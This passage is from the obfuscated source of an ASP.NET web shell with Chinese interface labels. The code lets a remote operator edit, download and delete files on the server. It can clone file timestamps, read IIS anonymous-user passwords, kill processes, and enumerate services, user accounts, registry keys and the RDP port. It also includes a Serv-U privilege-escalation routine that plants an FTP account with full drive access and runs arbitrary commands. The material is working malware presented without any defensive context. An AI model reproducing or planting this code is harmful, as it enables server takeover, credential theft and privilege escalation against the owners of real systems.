created success !");<BR>}<BR>catch(Exception error)<BR>{<BR>xseuB(error.Message);<BR>}<BR>krIR(AXSbb.Value);<BR>}<BR>public void gLKc(string path)<BR>{<BR>if(Request["__EVENTTARGET"]=="Bin_Editfile" || Request["__EVENTTARGET"]=="Bin_Createfile")<BR>{<BR>foreach(ListItem item in NdCX.Items)<BR>{<BR>if(item.Selected=true)<BR>{<BR>item.Selected=false;<BR>}<BR>}<BR>}<BR>Bin_H2_Title.InnerHtml="创建/编辑文件 &gt;&gt;";<BR>WICxe();<BR>vrFA.Visible=true;<BR>if(path.IndexOf(":")&lt; 0)<BR>{<BR>Sqon.Value=AXSbb.Value+path;<BR>}<BR>else<BR>{<BR>Sqon.Value=path;<BR>}<BR>if(File.Exists(Sqon.Value))<BR>{<BR>StreamReader sr;<BR>if(NdCX.SelectedItem.Text=="UTF-8")<BR>{<BR>sr=new StreamReader(Sqon.Value,Encoding.UTF8);<BR>}<BR>else<BR>{<BR>sr=new StreamReader(Sqon.Value,Encoding.Default);<BR>}<BR>Xgvv.InnerText=sr.ReadToEnd();<BR>sr.Close();<BR>}<BR>else<BR>{<BR>Xgvv.InnerText=string.Empty;<BR>}<BR>}<BR>public void ksGR(string path)<BR>{<BR>FileInfo fs=new FileInfo(path);<BR>Response.Clear();<BR>Page.Response.ClearHeaders();<BR>Page.Response.Buffer=false;<BR>this.EnableViewState=false;<BR>Response.AddHeader("Content-Disposition","attachment;filename="+HttpUtility.UrlEncode(fs.Name,System.Text.Encoding.UTF8));<BR>Response.AddHeader("Content-Length",fs.Length.ToString());<BR>Page.Response.ContentType="application/unknown";<BR>Response.WriteFile(fs.FullName);<BR>Page.Response.Flush();<BR>Page.Response.Close();<BR>Response.End();<BR>Page.Response.Clear();<BR>}<BR>public void SJv(string path)<BR>{<BR>try<BR>{<BR>string[] spdT=path.Split(',');<BR>for(int i=0;i&lt;spdT.Length-1;i++)<BR>{<BR>File.Delete(AXSbb.Value+Ebgw(spdT[i]));<BR>}<BR>xseuB("File Delete Success !");<BR>}<BR>catch(Exception error)<BR>{<BR>xseuB(error.Message);<BR>}<BR>krIR(AXSbb.Value);<BR>}<BR>public void hae()<BR>{<BR>try<BR>{<BR>File.Delete(Request.PhysicalPath);</P>
<P>}<BR>catch(Exception error)<BR>{<BR>xseuB(error.Message);<BR>}<BR>}<BR>public void cYAl(string path)<BR>{<BR>Bin_H2_Title.InnerHtml="克隆文件的最后修改时间 &gt;&gt;";<BR>WICxe();<BR>zRyG.Visible=true;<BR>QiFB.Value=AXSbb.Value+path;<BR>lICp.Value=AXSbb.Value;<BR>pWVL.Value=AXSbb.Value+path;<BR>string Att=File.GetAttributes(QiFB.Value).ToString();<BR>if(Att.LastIndexOf("ReadOnly")!=-1)<BR>{<BR>ZhWSK.Checked=true;<BR>}<BR>if(Att.LastIndexOf("System")!=-1)<BR>{<BR>SsR.Checked=true;<BR>}<BR>if(Att.LastIndexOf("Hidden")!=-1)<BR>{<BR>ccB.Checked=true;<BR>}<BR>if(Att.LastIndexOf("Archive")!=-1)<BR>{<BR>fbyZ.Checked=true;<BR>}<BR>yUqx.Value=File.GetCreationTimeUtc(pWVL.Value).ToString();<BR>uYjw.Value=File.GetLastWriteTimeUtc(pWVL.Value).ToString();<BR>aLsn.Value=File.GetLastAccessTimeUtc(pWVL.Value).ToString();<BR>}<BR>public static String mTG(Int64 fileSize)<BR>{<BR>if(fileSize&lt;0)<BR>{<BR>throw new ArgumentOutOfRangeException("fileSize");<BR>}<BR>else if(fileSize &gt;= 1024 * 1024 * 1024)<BR>{<BR>return string.Format("{0:########0.00} G",((Double)fileSize)/(1024 * 1024 * 1024));<BR>}<BR>else if(fileSize &gt;= 1024 * 1024)<BR>{<BR>return string.Format("{0:####0.00} M",((Double)fileSize)/(1024 * 1024));<BR>}<BR>else if(fileSize &gt;= 1024)<BR>{<BR>return string.Format("{0:####0.00} K",((Double)fileSize)/ 1024);<BR>}<BR>else<BR>{<BR>return string.Format("{0} B",fileSize);<BR>}<BR>}<BR>private bool SGde(string sSrc)<BR>{<BR>Regex reg=new Regex(@"^0|[0-9]*[1-9][0-9]*$");<BR>if(reg.IsMatch(sSrc))<BR>{<BR>return true;<BR>}<BR>else<BR>{<BR>return false;<BR>}<BR>}<BR>public void AdCx()<BR>{<BR>string qcKu=string.Empty;<BR>string mWGEm="IIS://localhost/W3SVC";<BR>GlI.Style.Add("word-break","break-all");<BR>try<BR>{<BR>DirectoryEntry HHzcY=new DirectoryEntry(mWGEm);<BR>int fmW=0;<BR>foreach(DirectoryEntry child in HHzcY.Children)<BR>{<BR>if(SGde(child.Name.ToString()))<BR>{<BR>fmW++;<BR>DirectoryEntry newdir=new DirectoryEntry(mWGEm+"/"+child.Name.ToString());<BR>DirectoryEntry HlyU=newdir.Children.Find("root","IIsWebVirtualDir");<BR>string bg=OKM();<BR>TableRow TR=new TableRow();<BR>TR.Attributes["onmouseover"]="this.className='focus';";<BR>TR.CssClass=bg;<BR>TR.Attributes["onmouseout"]="this.className='"+bg+"';";<BR>TR.Attributes["title"]="Site:"+child.Properties["ServerComment"].Value.ToString();<BR>for(int i=1;i&lt;6;i++)<BR>{<BR>try<BR>{<BR>TableCell tfit=new TableCell();<BR>switch(i)<BR>{case 1:<BR>tfit.Text=fmW.ToString();<BR>break;<BR>case 2:<BR>tfit.Text=HlyU.Properties["AnonymousUserName"].Value.ToString();<BR>break;<BR>case 3:<BR>tfit.Text=HlyU.Properties["AnonymousUserPass"].Value.ToString();<BR>break;<BR>case 4:<BR>StringBuilder sb=new StringBuilder();<BR>PropertyValueCollection pc=child.Properties["ServerBindings"];<BR>for (int j=0; j &lt; pc.Count; j++)<BR>{<BR>sb.Append(pc[j].ToString()+"&lt;br&gt;");<BR>}<BR>tfit.Text=sb.ToString().Substring(0,sb.ToString().Length-4);<BR>break;<BR>case 5:<BR>tfit.Text="&lt;a href=\"javascript:Bin_PostBack('Bin_Listdir','"+MVVJ(HlyU.Properties["Path"].Value.ToString())+"')\"&gt;"+HlyU.Properties["Path"].Value.ToString()+"&lt;/a&gt;";<BR>break;<BR>}<BR>TR.Cells.Add(tfit);<BR>}<BR>catch (Exception ex)<BR>{<BR>xseuB(ex.Message);<BR>continue;<BR>}<BR>}<BR>GlI.Controls.Add(TR);<BR>}<BR>}<BR>}<BR>catch(Exception ex)<BR>{<BR>xseuB(ex.Message);<BR>}<BR>}<BR>public ManagementObjectCollection PhQTd(string query)<BR>{<BR>ManagementObjectSearcher QS=new ManagementObjectSearcher(new SelectQuery(query));<BR>return QS.Get();<BR>}<BR>public DataTable cCf(string query)<BR>{<BR>DataTable dt=new DataTable();<BR>int i=0;<BR>ManagementObjectSearcher QS=new ManagementObjectSearcher(new SelectQuery(query));<BR>try<BR>{<BR>foreach(ManagementObject m in QS.Get())<BR>{<BR>DataRow dr=dt.NewRow();<BR>PropertyDataCollection.PropertyDataEnumerator oEnum;<BR>oEnum=(m.Properties.GetEnumerator()as PropertyDataCollection.PropertyDataEnumerator);<BR>while(oEnum.MoveNext())<BR>{<BR>PropertyData DRU=(PropertyData)oEnum.Current;<BR>if(dt.Columns.IndexOf(DRU.Name)==-1)<BR>{<BR>dt.Columns.Add(DRU.Name);<BR>dt.Columns[dt.Columns.Count-1].DefaultValue="";<BR>}<BR>if(m[DRU.Name]!=null)<BR>{<BR>dr[DRU.Name]=m[DRU.Name].ToString();<BR>}<BR>else<BR>{<BR>dr[DRU.Name]=string.Empty;<BR>}<BR>}<BR>dt.Rows.Add(dr);<BR>}<BR>}<BR>catch(Exception error)<BR>{<BR>}<BR>return dt;<BR>}<BR>public void YUw()<BR>{<BR>try<BR>{<BR>Bin_H2_Title.InnerText="系统进程 &gt;&gt;";<BR>WICxe();<BR>DCbS.Visible=true;<BR>int UEbTI=0;<BR>Process[] p=Process.GetProcesses();<BR>foreach(Process sp in p)<BR>{<BR>UEbTI++;<BR>string bg=OKM();<BR>TableRow tr=new TableRow();<BR>tr.Attributes["onmouseover"]="this.className='focus';";<BR>tr.CssClass=bg;<BR>tr.Attributes["onmouseout"]="this.className='"+bg+"';";<BR>for(int i=1;i&lt;7;i++)<BR>{<BR>TableCell td=new TableCell();<BR>if(i==1)<BR>{<BR>td.Width=Unit.Parse("2%");<BR>td.Text=UEbTI.ToString();<BR>tr.Controls.Add(td);<BR>}<BR>if(i==2)<BR>{<BR>td.Text=sp.Id.ToString();<BR>tr.Controls.Add(td);<BR>}<BR>if(i==3)<BR>{<BR>td.Text=sp.ProcessName.ToString();<BR>tr.Controls.Add(td);<BR>}<BR>if(i==4)<BR>{<BR>td.Text=sp.Threads.Count.ToString();<BR>tr.Controls.Add(td);<BR>}<BR>if(i==5)<BR>{<BR>td.Text=sp.BasePriority.ToString();<BR>tr.Controls.Add(td);<BR>}<BR>if(i==6)<BR>{<BR>td.Text="--";<BR>tr.Controls.Add(td);<BR>}<BR>}<BR>IjsL.Controls.Add(tr);<BR>}<BR>}<BR>catch(Exception error)<BR>{<BR>AIz();<BR>}<BR>AIz();<BR>}<BR>public void AIz()<BR>{<BR>try<BR>{<BR>Bin_H2_Title.InnerText="系统进程 &gt;&gt;";<BR>WICxe();<BR>DCbS.Visible=true;<BR>int UEbTI=0;<BR>DataTable dt=cCf("Win32_Process");<BR>for(int j=0;j&lt;dt.Rows.Count;j++)<BR>{<BR>UEbTI++;<BR>string bg=OKM();<BR>TableRow tr=new TableRow();<BR>tr.Attributes["onmouseover"]="this.className='focus';";<BR>tr.CssClass=bg;<BR>tr.Attributes["onmouseout"]="this.className='"+bg+"';";<BR>for(int i=1;i&lt;7;i++)<BR>{<BR>TableCell td=new TableCell();<BR>if(i==1)<BR>{<BR>td.Width=Unit.Parse("2%");<BR>td.Text=UEbTI.ToString();<BR>tr.Controls.Add(td);<BR>}<BR>if(i==2)<BR>{<BR>td.Text=dt.Rows[j]["ProcessID"].ToString();<BR>tr.Controls.Add(td);<BR>}<BR>if(i==3)<BR>{<BR>td.Text=dt.Rows[j]["Name"].ToString();<BR>tr.Controls.Add(td);<BR>}<BR>if(i==4)<BR>{<BR>td.Text=dt.Rows[j]["ThreadCount"].ToString();<BR>tr.Controls.Add(td);<BR>}<BR>if(i==5)<BR>{<BR>td.Text=dt.Rows[j]["Priority"].ToString();<BR>tr.Controls.Add(td);<BR>}<BR>if(i==6)<BR>{<BR>if( dt.Rows[j]["CommandLine"]!=string.Empty)<BR>{<BR>td.Text="&lt;a href=\"javascript:Bin_PostBack('urJG','"+dt.Rows[j]["ProcessID"].ToString()+"')\"&gt;Kill&lt;/a&gt;";<BR>}<BR>else<BR>{<BR>td.Text="--";<BR>}<BR>tr.Controls.Add(td);<BR>}<BR>}<BR>IjsL.Controls.Add(tr);<BR>}<BR>}<BR>catch(Exception error)<BR>{<BR>xseuB(error.Message);<BR>}<BR>}<BR>public void urJG(string pid)<BR>{<BR>try<BR>{<BR>foreach(ManagementObject p in PhQTd("Select * from Win32_Process Where ProcessID ='"+pid+"'"))<BR>{<BR>p.InvokeMethod("Terminate",null);<BR>p.Dispose();<BR>}<BR>xseuB("Process Kill Success !");<BR>}<BR>catch(Exception error)<BR>{<BR>xseuB(error.Message);<BR>}<BR>AIz();<BR>}<BR>public void oHpF()<BR>{<BR>try<BR>{<BR>Bin_H2_Title.InnerText="系统服务 &gt;&gt;";<BR>WICxe();<BR>iQxm.Visible=true;<BR>int UEbTI=0;<BR>ServiceController[] kQmRu=System.ServiceProcess.ServiceController.GetServices();<BR>for(int i=0;i&lt;kQmRu.Length;i++)<BR>{<BR>UEbTI++;<BR>string bg=OKM();<BR>TableRow tr=new TableRow();<BR>tr.Attributes["onmouseover"]="this.className='focus';";<BR>tr.CssClass=bg;<BR>tr.Attributes["onmouseout"]="this.className='"+bg+"';";<BR>for(int b=1;b&lt;7;b++)<BR>{<BR>TableCell td=new TableCell();<BR>if(b==1)<BR>{<BR>td.Width=Unit.Parse("2%");<BR>td.Text=UEbTI.ToString();<BR>tr.Controls.Add(td);<BR>}<BR>if(b==2)<BR>{<BR>td.Text="null";<BR>tr.Controls.Add(td);<BR>}<BR>if(b==3)<BR>{<BR>td.Text=kQmRu[i].ServiceName.ToString();<BR>tr.Controls.Add(td);<BR>}<BR>if(b==4)<BR>{<BR>td.Text="";<BR>tr.Controls.Add(td);<BR>}<BR>if(b==5)<BR>{<BR>string kOIo=kQmRu[i].Status.ToString();<BR>if(kOIo=="Running")<BR>{<BR>td.Text="&lt;font color=green&gt;"+kOIo+"&lt;/font&gt;";<BR>}<BR>else<BR>{<BR>td.Text="&lt;font color=red&gt;"+kOIo+"&lt;/font&gt;";<BR>}<BR>tr.Controls.Add(td);<BR>}<BR>if(b==6)<BR>{<BR>td.Text="";<BR>tr.Controls.Add(td);<BR>}<BR>}<BR>vHCs.Controls.Add(tr);<BR>}<BR>}<BR>catch(Exception error)<BR>{<BR>xseuB(error.Message);<BR>}<BR>}<BR>public void tZRH()<BR>{<BR>try<BR>{<BR>Bin_H2_Title.InnerText="系统服务 &gt;&gt;";<BR>WICxe();<BR>iQxm.Visible=true;<BR>int UEbTI=0;<BR>DataTable dt=cCf("Win32_Service");<BR>for(int j=0;j&lt;dt.Rows.Count;j++)<BR>{<BR>UEbTI++;<BR>string bg=OKM();<BR>TableRow tr=new TableRow();<BR>tr.Attributes["onmouseover"]="this.className='focus';";<BR>tr.CssClass=bg;<BR>tr.Attributes["onmouseout"]="this.className='"+bg+"';";<BR>tr.Attributes["title"]=dt.Rows[j]["Description"].ToString();<BR>for(int i=1;i&lt;7;i++)<BR>{<BR>TableCell td=new TableCell();<BR>if(i==1)<BR>{<BR>td.Width=Unit.Parse("2%");<BR>td.Text=UEbTI.ToString();<BR>tr.Controls.Add(td);<BR>}<BR>if(i==2)<BR>{<BR>td.Text=dt.Rows[j]["ProcessID"].ToString();<BR>tr.Controls.Add(td);<BR>}<BR>if(i==3)<BR>{<BR>td.Text=dt.Rows[j]["Name"].ToString();<BR>tr.Controls.Add(td);<BR>}<BR>if(i==4)<BR>{<BR>td.Text=dt.Rows[j]["PathName"].ToString();<BR>tr.Controls.Add(td);<BR>}<BR>if(i==5)<BR>{<BR>string kOIo=dt.Rows[j]["State"].ToString();<BR>if(kOIo=="Running")<BR>{<BR>td.Text="&lt;font color=green&gt;"+kOIo+"&lt;/font&gt;";<BR>}<BR>else<BR>{<BR>td.Text="&lt;font color=red&gt;"+kOIo+"&lt;/font&gt;";<BR>}<BR>tr.Controls.Add(td);<BR>}<BR>if(i==6)<BR>{<BR>td.Text=dt.Rows[j]["StartMode"].ToString();<BR>tr.Controls.Add(td);<BR>}<BR>}<BR>vHCs.Controls.Add(tr);<BR>}<BR>}<BR>catch(Exception error)<BR>{<BR>oHpF();<BR>}<BR>}<BR>public void PLd()<BR>{<BR>try<BR>{<BR>WICxe();<BR>xWVQ.Visible=true;<BR>Bin_H2_Title.InnerText="用户(组)信息 &gt;&gt;";<BR>DirectoryEntry TWQ=new DirectoryEntry("WinNT://"+Environment.MachineName.ToString());<BR>foreach(DirectoryEntry child in TWQ.Children)<BR>{<BR>foreach(string name in child.Properties.PropertyNames)<BR>{<BR>PropertyValueCollection pvc=child.Properties[name];<BR>int c=pvc.Count;<BR>for(int i=0;i&lt;c;i++)<BR>{<BR>if(name!="objectSid" && name!="Parameters" && name!="LoginHours")<BR>{<BR>string bg=OKM();<BR>TableRow tr=new TableRow();<BR>tr.Attributes["onmouseover"]="this.className='focus';";<BR>tr.CssClass=bg;<BR>tr.Attributes["onmouseout"]="this.className='"+bg+"';";<BR>TableCell td=new TableCell();<BR>td.Text=name;<BR>tr.Controls.Add(td);<BR>TableCell td1=new TableCell();<BR>td1.Text=pvc[i].ToString();<BR>tr.Controls.Add(td1);<BR>VPa.Controls.Add(tr);<BR>}<BR>}<BR>}<BR>TableRow trn=new TableRow();<BR>for(int x=1;x&lt;3;x++)<BR>{<BR>TableCell tdn=new TableCell();<BR>tdn.Attributes["style"]="height:2px;background-color:#bbbbbb;";<BR>trn.Controls.Add(tdn);<BR>VPa.Controls.Add(trn);<BR>}<BR>}<BR>}<BR>catch(Exception error)<BR>{<BR>xseuB(error.Message);<BR>}<BR>}<BR>public void iLVUT()<BR>{<BR>try<BR>{<BR>WICxe();<BR>xWVQ.Visible=true;<BR>Bin_H2_Title.InnerText="用户(组)信息 &gt;&gt;";<BR>DataTable user=cCf("Win32_UserAccount");<BR>for(int i=0;i&lt;user.Rows.Count;i++)<BR>{<BR>for(int j=0;j&lt;user.Columns.Count;j++)<BR>{<BR>string bg=OKM();<BR>TableRow tr=new TableRow();<BR>tr.Attributes["onmouseover"]="this.className='focus';";<BR>tr.CssClass=bg;<BR>tr.Attributes["onmouseout"]="this.className='"+bg+"';";<BR>TableCell td=new TableCell();<BR>td.Text=user.Columns[j].ToString();<BR>tr.Controls.Add(td);<BR>TableCell td1=new TableCell();<BR>td1.Text=user.Rows[i][j].ToString();<BR>tr.Controls.Add(td1);<BR>VPa.Controls.Add(tr);<BR>}<BR>TableRow trn=new TableRow();<BR>for(int x=1;x&lt;3;x++)<BR>{<BR>TableCell tdn=new TableCell();<BR>tdn.Attributes["style"]="height:2px;background-color:#bbbbbb;";<BR>trn.Controls.Add(tdn);<BR>VPa.Controls.Add(trn);<BR>}<BR>}<BR>}<BR>catch(Exception error)<BR>{<BR>PLd();<BR>}<BR>}<BR>public void pDVM()<BR>{<BR>try<BR>{<BR>RegistryKey EeZ=Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp");<BR>string IKjwH=DdmPl(EeZ,"PortNumber");<BR>RegistryKey izN=Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\CentralProcessor");<BR>int cpu=izN.SubKeyCount;<BR>RegistryKey mQII=Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\CentralProcessor\0\");<BR>string NPPZ=DdmPl(mQII,"ProcessorNameString");<BR>WICxe();<BR>ghaB.Visible=true;<BR>Bin_H2_Title.InnerText="系统信息 &gt;&gt;";<BR>Bin_H2_Mac.InnerText="网卡信息 &gt;&gt;";<BR>Bin_H2_Driver.InnerText="驱动信息 &gt;&gt;";<BR>StringBuilder yEwc=new StringBuilder();<BR>StringBuilder hwJeS=new StringBuilder();<BR>StringBuilder jXkaE=new StringBuilder();<BR>yEwc.Append("&lt;li&gt;&lt;u&gt;Server Domain : &lt;/u&gt;"+Request.ServerVariables["SERVER_NAME"]+"&lt;/li&gt;");<BR>yEwc.Append("&lt;li&gt;&lt;u&gt;Server Ip : &lt;/u&gt;"+Request.ServerVariables["LOCAL_ADDR"]+":"+Request.ServerVariables["SERVER_PORT"]+"&lt;/li&gt;");<BR>yEwc.Append("&lt;li&gt;&lt;u&gt;Terminal Port : &lt;/u&gt;"+IKjwH+"&lt;/li&gt;");<BR>yEwc.Append("&lt;li&gt;&lt;u&gt;Server OS : &lt;/u&gt;"+Environment.OSVersion+"&lt;/li&gt;");<BR>yEwc.Append("&lt;li&gt;&lt;u&gt;Server Software : &lt;/u&gt;"+Request.ServerVariables["SERVER_SOFTWARE"]+"&lt;/li&gt;");<BR>yEwc.Append("&lt;li&gt;&lt;u&gt;Server UserName : &lt;/u&gt;"+Environment.UserName+"&lt;/li&gt;");<BR>yEwc.Append("&lt;li&gt;&lt;u&gt;Server Time : &lt;/u&gt;"+System.DateTime.Now.ToString()+"&lt;/li&gt;");<BR>yEwc.Append("&lt;li&gt;&lt;u&gt;Server TimeZone : &lt;/u&gt;"+cCf("Win32_TimeZone").Rows[0]["Caption"]+"&lt;/li&gt;");<BR>DataTable BIOS=cCf("Win32_BIOS");<BR>yEwc.Append("&lt;li&gt;&lt;u&gt;Server BIOS : &lt;/u&gt;"+BIOS.Rows[0]["Manufacturer"]+" : "+BIOS.Rows[0]["Name"]+"&lt;/li&gt;");<BR>yEwc.Append("&lt;li&gt;&lt;u&gt;CPU Count : &lt;/u&gt;"+cpu.ToString()+"&lt;/li&gt;");<BR>yEwc.Append("&lt;li&gt;&lt;u&gt;CPU Version : &lt;/u&gt;"+NPPZ+"&lt;/li&gt;");<BR>DataTable upM=cCf("Win32_PhysicalMemory");<BR>Int64 oZnZV=0;<BR>for(int i=0;i&lt;upM.Rows.Count;i++)<BR>{<BR>oZnZV+=Int64.Parse(upM.Rows[0]["Capacity"].ToString());<BR>}<BR>yEwc.Append("&lt;li&gt;&lt;u&gt;Server upM : &lt;/u&gt;"+mTG(oZnZV)+"&lt;/li&gt;");<BR>DataTable dOza=cCf("Win32_NetworkAdapterConfiguration");<BR>for(int i=0;i&lt;dOza.Rows.Count;i++)<BR>{<BR>hwJeS.Append("&lt;li&gt;&lt;u&gt;Server MAC"+i+" : &lt;/u&gt;"+dOza.Rows[i]["Caption"]+"&lt;/li&gt;");<BR>if(dOza.Rows[i]["MACAddress"]!=string.Empty)<BR>{<BR>hwJeS.Append("&lt;li style=\"list-style:none;\"&gt;&lt;u&gt;Address : &lt;/u&gt;"+dOza.Rows[i]["MACAddress"]+"&lt;/li&gt;");<BR>}<BR>}<BR>DataTable Driver=cCf("Win32_SystemDriver");<BR>for (int i=0; i&lt;Driver.Rows.Count; i++)<BR>{<BR>jXkaE.Append("&lt;li&gt;&lt;u class='u1'&gt;Server Driver"+i+" : &lt;/u&gt;&lt;u class='u2'&gt;"+Driver.Rows[i]["Caption"]+"&lt;/u&gt; ");<BR>if (Driver.Rows[i]["PathName"]!=string.Empty)<BR>{<BR>jXkaE.Append("Path : "+Driver.Rows[i]["PathName"]);<BR>}<BR>else<BR>{<BR>jXkaE.Append("No path information");<BR>}<BR>jXkaE.Append("&lt;/li&gt;");<BR>}<BR>Bin_Ul_Sys.InnerHtml=yEwc.ToString();<BR>Bin_Ul_NetConfig.InnerHtml=hwJeS.ToString();<BR>Bin_Ul_Driver.InnerHtml=jXkaE.ToString();<BR>}<BR>catch(Exception error)<BR>{<BR>xseuB(error.Message);<BR>}<BR>}<BR>public void ADCpk()<BR>{<BR>WICxe();<BR>APl.Visible=true;<BR>Bin_H2_Title.InnerText="Serv-U 提权 &gt;&gt;";<BR>}<BR>public void lDODR()<BR>{<BR>string JGGg=string.Empty;<BR>string user=dNohJ.Value;<BR>string pass=NMd.Value;<BR>int port=Int32.Parse(HlQl.Value);<BR>string cmd=mHbjB.Value;<BR>string CRtK="user "+user+"\r\n";<BR>string jnNG="pass "+pass+"\r\n";<BR>string site="SITE MAINTENANCE\r\n";<BR>string mtoJb="-DELETEDOMAIN\r\n-IP=0.0.0.0\r\n PortNo=52521\r\n";<BR>string sutI="-SETDOMAIN\r\n-Domain=BIN|0.0.0.0|52521|-1|1|0\r\n-TZOEnable=0\r\n TZOKey=\r\n";<BR>string iVDT="-SETUSERSETUP\r\n-IP=0.0.0.0\r\n-PortNo=52521\r\n-User=bin\r\n-Password=binftp\r\n-HomeDir=c:\\\r\n-LoginMesFile=\r\n-Disable=0\r\n-RelPaths=1\r\n-NeedSecure=0\r\n-HideHidden=0\r\n-AlwaysAllowLogin=0\r\n-ChangePassword=0\r\n-QuotaEnable=0\r\n-MaxUsersLoginPerIP=-1\r\n-SpeedLimitUp=0\r\n-SpeedLimitDown=0\r\n-MaxNrUsers=-1\r\n-IdleTimeOut=600\r\n-SessionTimeOut=-1\r\n-Expire=0\r\n-RatioDown=1\r\n-RatiosCredit=0\r\n-QuotaCurrent=0\r\n-QuotaMaximum=0\r\n-Maintenance=System\r\n-PasswordType=Regular\r\n-Ratios=NoneRN\r\n Access=c:\\|RWAMELCDP\r\n";<BR>string zexn="QUIT\r\n";<BR>UHlA.Visible=true;<BR>try<BR>{<BR>tcp.Connect("127.0.0.1",port);<BR>tcp.ReceiveBufferSize=1024;<BR>NS=tcp.GetStream();<BR>Rev(NS);<BR>ZJiM(NS,CRtK);<BR>Rev(NS);<BR>ZJiM(NS,jnNG);<BR>Rev(NS);<BR>ZJiM(NS,site);<BR>Rev(NS);<BR>ZJiM(NS,mtoJb);<BR>Rev(NS);<BR>ZJiM(NS,sutI);<BR>Rev(NS);<BR>ZJiM(NS,iVDT);<BR>Rev(NS);<BR>Bin_Td_Res.InnerHtml+="&lt;font color=\"green\"&gt;&lt;b&gt;Exec Cmd.................\r\n&lt;/b&gt;&lt;/font&gt;";<BR>zvxm.Connect(Request.ServerVariables["LOCAL_ADDR"],52521);<BR>NS1=zvxm.GetStream();<BR>Rev(NS1);<BR>ZJiM(NS1,"user bin\r\n");<BR>Rev(NS1);<BR>ZJiM(NS1,"pass binftp\r\n");<BR>Rev(NS1);<BR>ZJiM(NS1,"site exec "+cmd+"\r\n");<BR>Rev(NS1);<BR>ZJiM(NS1,"quit\r\n");<BR>Rev(NS1);<BR>zvxm.Close();<BR>ZJiM(NS,mtoJb);<BR>Rev(NS);<BR>tcp.Close();<BR>}<BR>catch(Exception error)<BR>{<BR>xseuB(error.Message);<BR>}<BR>}<BR>protected void Rev(NetworkStream instream)<BR>{<BR>string FTBtf=string.Empty;<BR>if(instream.CanRead)<BR>{<BR>byte[] uPZ=new byte[1024];<BR>do<BR>{<BR>System.Threading.Thread.Sleep(50);<BR>int len=instream.Read(uPZ,0,uPZ.Length);<BR>FTBtf+=Encoding.Default.GetString(uPZ,0,len);<BR>}<BR>while(instream.DataAvailable);<BR>}<BR>Bin_Td_Res.InnerHtml+="&lt;font color=red&gt;"+FTBtf.Replace("\0","")+"&lt;/font&gt;";<BR>}<BR>protected void ZJiM(NetworkStream instream,string Sendstr)<BR>{<BR>if(instream.CanWrite)<BR>{<BR>byte[] uPZ=Encoding.Default.GetBytes(Sendstr);<BR>instream.Write(uPZ,0,uPZ.Length);<BR>}<BR>Bin_Td_Res.InnerHtml+="&lt;font color=blue&gt;"+Sendstr+"&lt;/font&gt;";<BR>}<BR>public void xFhz()<BR>{<BR>WICxe();<BR>kkHN.Visible=true;<BR>Bin_H2_Title.InnerText="注册表查询 &gt;&gt;";<BR>string txc=@"HKEY_LOCAL_MACHINE|HKEY_CLASSES_ROOT|HKEY_CURRENT_USER|HKEY_USERS|HKEY_CURRENT_CONFIG";<BR>vyX.Text="";<BR>foreach(string rootkey in txc.Split('|'))<BR>{<BR>vyX.Text+="&lt;a href=\"javascript:Bin_PostBack('Bin_Regread','"+MVVJ(rootkey)+"')\"&gt;"+rootkey+"&lt;/a&gt; | ";<BR>}<BR>lFAvw();<BR>}<BR>protected void lFAvw()<BR>{<BR>qPdI.Text="";<BR>string txc=@"HKEY_LOCAL_MACHINE|HKEY_CLASSES_ROOT|HKEY_CURRENT_USER|HKEY_USERS|HKEY_CURRENT_CONFIG";<BR>TableRow tr;<BR>TableCell tc;<BR>foreach(string rootkey in txc.Split('|'))<BR>{<BR>tr=new TableRow();<BR>tc=new TableCell();<BR>string bg=OKM();<BR>tr.Attributes["onmouseover"]="this.className='focus';";<BR>tr.CssClass=bg;<BR>tr.Attributes["onmouseout"]="this.className='"+bg+"';";<BR>tc.Width=Unit.Parse("40%");<BR>tc.Text="&lt;a href=\"javascript:Bin_PostBack('Bin_Regread','"+MVVJ(rootkey)+"')\"&gt;"+rootkey+"&lt;/a&gt;";<BR>tr.Cells.Add(tc);<BR>tc=new TableCell();<BR>tc.Width=Unit.Parse("60%");<BR>tc.Text="&lt;RootKey&gt;";<BR>tr.Cells.Add(tc);<BR>pLWD.Rows.Add(tr);<BR>}<BR>}<BR>protected void tpRQ(string Reg_Path)<BR>{<BR>if(!Reg_Path.EndsWith("\\"))<BR>{<BR>Reg_Path=Reg_Path+"\\";<BR>}<BR>qPdI.Text=Reg_Path;<BR>string cJG=Regex.Replace(Reg_Path,@"\\[^\\]+\\?$","");<BR>cJG=Regex.Replace(cJG,@"\\+","\\");<BR>TableRow tr=new TableRow();<BR>TableCell tc=new TableCell();<BR>string bg=OKM();<BR>tr.Attributes["onmouseover"]="this.className='focus';";<BR>tr.CssClass=bg;<BR>tr.Attributes["onmouseout"]="this.className='"+bg+"';";<BR>tc.Text="&lt;a href=\"javascript:Bin_PostBack('Bin_Regread','"+MVVJ(cJG)+"')\"&gt;Parent Key&lt;/a&gt;";<BR>tc.Attributes["colspan"]="2" ;<BR>tr.Cells.Add(tc);<BR>pLWD.Rows.Add(tr);<BR>try<BR>{<BR>string subpath;<BR>string kDgkX=Reg_Path.Substring(Reg_Path.IndexOf("\\")+1,Reg_Path.Length-Reg_Path.IndexOf("\\")-1);<BR>RegistryKey rk=null;<BR>RegistryKey sk;<BR>if(Reg_Path.StartsWith("HKEY_LOCAL_MACHINE"))<BR>{<BR>rk=Registry.LocalMachine;<BR>}<BR>else if(Reg_Path.StartsWith("HKEY_CLASSES_ROOT"))<BR>{<BR>rk=Registry.ClassesRoot;<BR>}<BR>else if(Reg_Path.StartsWith("HKEY_CURRENT_USER"))<BR>{<BR>rk=Registry.CurrentUser;<BR>}<BR>else if(Reg_Path.StartsWith("HKEY_USERS"))<BR>{<BR>rk=Registry.Users;<BR>}<BR>else if(Reg_Path.StartsWith("HKEY_CURRENT_CONFIG"))<BR>{<BR>rk=Registry.CurrentConfig;<BR>}<BR>if(kDgkX.Length&gt;1)<BR>{<BR>sk=rk.OpenSubKey(kDgkX);<BR>}<BR>else<BR>{<BR>sk=rk;<BR>}<BR>foreach(string innerSubKey in sk.GetSubKeyNames())<BR>{<BR>tr=new TableRow();<BR>tc=new TableCell();<BR>bg=OKM();<BR>tr.Attributes["onmouseover"]="this.className='focus';";<BR>tr.CssClass=bg;<BR>tr.Attributes["onmouseout"]="this.className='"+bg+"';";<BR>tc.Width=Unit.Parse("40%");<BR>tc.Text="&lt;a 